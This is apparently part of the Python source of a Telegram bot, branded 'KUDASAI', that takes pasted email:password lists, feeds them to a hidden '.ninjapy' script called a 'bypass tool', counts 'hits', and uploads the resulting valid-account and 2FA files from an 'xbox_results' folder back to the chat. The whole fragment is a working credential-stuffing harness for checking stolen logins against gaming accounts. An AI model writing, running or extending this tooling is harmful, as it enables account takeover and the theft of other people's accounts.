def generate_progress_bar(current, total, length=10):
    if total == 0: return f"[░░░░░░░░░░] 0% (0/0)"
    filled = int(round(length * current / float(total)))
    filled = max(0, min(length, filled)) # Clamp between 0 and length
    bar = '█' * filled + '░' * (length - filled)
    percentage = int(round((current / float(total)) * 100))
    return f"[{bar}] {percentage}% ({current}/{total})"

async def process_accounts_with_progress(account_lines, chat_id, context: ContextTypes.DEFAULT_TYPE):
    valid_accounts = [line.strip() for line in account_lines if ":" in line and "@" in line]
    total = len(valid_accounts)
    
    if total == 0:
        await context.bot.send_message(chat_id=chat_id, text="❌ **[KUDASAI]** No valid `email:password` accounts detected.")
        return

    # 1. Clean previous results
    if os.path.exists(TOOL_RESULTS_FOLDER):
        for f in os.listdir(TOOL_RESULTS_FOLDER):
            try: os.remove(os.path.join(TOOL_RESULTS_FOLDER, f))
            except: pass

    # 2. Write accounts.txt for .ninjapy
    with open("accounts.txt", "w", encoding="utf-8") as f:
        for acc in valid_accounts:
            f.write(acc + "\n")

    status_msg = await context.bot.send_message(
        chat_id=chat_id,
        text=f"🚀 **[KUDASAI] ENGINE INITIALIZED**\n\n"
             f"📊 Progress: `[░░░░░░░░░░] 0% (0/{total})`\n"
             f"🎯 Hits Found: 0\n"
             f"⏳ Current: Injecting accounts into bypass tool..."
    )

    start_time = time.time()
    
    # 3. Execute tool via Asyncio Subprocess to read live output
    process = await asyncio.create_subprocess_exec(
        "python3", ".ninjapy", "accounts.txt",
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT
    )

    # Automatically "type" standard inputs just in case the tool asks
    try:
        process.stdin.write(b"accounts.txt\n")
        process.stdin.write(b"50\n") # Common thread count prompt
        process.stdin.write(b"n\n")  # Common proxy prompt
        await process.stdin.drain()
    except Exception:
        pass

    processed = 0
    hits = 0
    last_update = time.time()

    # 4. Read the terminal output of .ninjapy live
    while True:
        try:
            line = await asyncio.wait_for(process.stdout.readline(), timeout=0.5)
        except asyncio.TimeoutError:
            if process.returncode is not None:
                break
            continue

        if not line:
            if process.returncode is not None:
                break
            continue

        output_str = line.decode('utf-8', errors='ignore').strip()
        if not output_str:
            continue

        processed += 1
        if processed > total: 
            processed = total

        lower_out = output_str.lower()
        if "hit" in lower_out or "success" in lower_out or "valid" in lower_out:
            hits += 1

        # Throttle Telegram edits to once every 2 seconds to avoid flood limits
        now = time.time()
        if now - last_update > 2.0:
            bar = generate_progress_bar(processed, total)
            try:
                await status_msg.edit_text(
                    text=f"🚀 **[KUDASAI] CHECKING IN PROGRESS**\n\n"
                         f"📊 Progress: `{bar}`\n"
                         f"🎯 Hits: ~{hits}\n"
                         f"🖥️ Console: `{output_str[-40:]}`",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
            last_update = now

    await process.wait()
    bot_stats["total_processed"] += total
    elapsed = round(time.time() - start_time, 2)
    
    await status_msg.edit_text(
        text=f"✅ **[KUDASAI] SCAN COMPLETED!**\n\n"
             f"📊 Total Checked: {total}\n"
             f"⏱️ Time Taken: {elapsed} seconds\n\n"
             f"📁 Uploading hits from `xbox_results`...",
        parse_mode="Markdown"
    )

    # 5. Automatically pull the generated hit files from xbox_results
    sent_any = False
    if os.path.exists(TOOL_RESULTS_FOLDER):
        for filename in os.listdir(TOOL_RESULTS_FOLDER):
            file_path = os.path.join(TOOL_RESULTS_FOLDER, filename)
            if os.path.isfile(file_path) and os.path.getsize(file_path) > 0:
                with open(file_path, "rb") as f:
                    await context.bot.send_document(chat_id=chat_id, document=f, caption=f"📁 Hit Result: {filename}")
                sent_any = True
                try: os.remove(file_path)
                except: pass

    # Fallback in case they drop in the root folder
    for fallback in ["results.txt", "2fa.txt", "errors.txt", "hits.txt", "valid.txt"]:
        if os.path.exists(fallback) and os.path.getsize(fallback) > 0:
            with open(fallback, "rb") as f:
                await context.bot.send_document(chat_id=chat_id, document=f, caption=f"📁 Output: {fallback}")
            sent_any = True
            try: os.remove(fallback)
            except: pass

    if os.path.exists("accounts.txt"):
        try: os.remove("accounts.txt")
        except: pass

    if not sent_any:
        await context.bot.send_message(chat_id=chat_id, text="ℹ️ Checking finished, but no valid hits were found or saved by the tool.")

